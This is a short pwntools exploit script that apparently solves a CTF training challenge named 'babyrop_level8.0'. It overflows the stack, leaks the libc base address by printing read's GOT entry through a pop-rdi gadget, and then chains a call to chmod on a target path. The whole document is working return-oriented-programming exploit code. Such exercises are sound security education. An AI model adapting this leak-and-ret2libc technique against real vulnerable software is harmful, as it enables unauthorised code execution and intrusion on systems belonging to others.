from pwn import *

p = process('/challenge/babyrop_level8.0')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#context.log_level = 'debug'
#gdb.attach(p,'''break *0x40217f''')
gadget1 = 0x4022a3      # pop rdi ; ret
gadget2 = 0x4022a1      # pop rsi ; ret
puts_plt = 0x401110 
read_got = 0x405040    
string = 0x4035da  
payload = b'A'*56 + p64(gadget1) + p64(read_got) + p64(puts_plt) + p64(0x402000)
p.send(payload)    
p.recvuntil('Leaving!\n')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym['read']
print('[+] Libc base address: '+hex(libc.address))
 
payload1 = b'B'*56 + p64(gadget1) + p64(string)
payload1 += p64(gadget2) + p64(0x7)*2
payload1 += p64(libc.sym['chmod'])
p.send(payload1)

p.interactive()
